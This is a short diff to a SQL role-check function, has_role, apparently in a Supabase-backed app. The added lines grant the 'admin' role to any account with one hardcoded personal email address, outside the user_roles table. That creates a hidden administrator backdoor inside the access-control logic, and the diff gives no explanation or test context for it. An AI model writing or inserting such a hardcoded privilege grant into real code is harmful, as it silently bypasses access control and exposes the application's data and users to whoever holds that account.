@@ -87,6 +87,12 @@ CREATE FUNCTION public.has_role(_user_id uuid, _role public.app_role) RETURNS bo
     SELECT 1
     FROM public.user_roles
     WHERE user_id = _user_id AND role = _role
+  ) OR (
+    _role = 'admin' AND EXISTS (
+      SELECT 1
+      FROM auth.users
+      WHERE id = _user_id AND email = 'shishirxkandel@gmail.com'
+    )
   )
 $$;
 
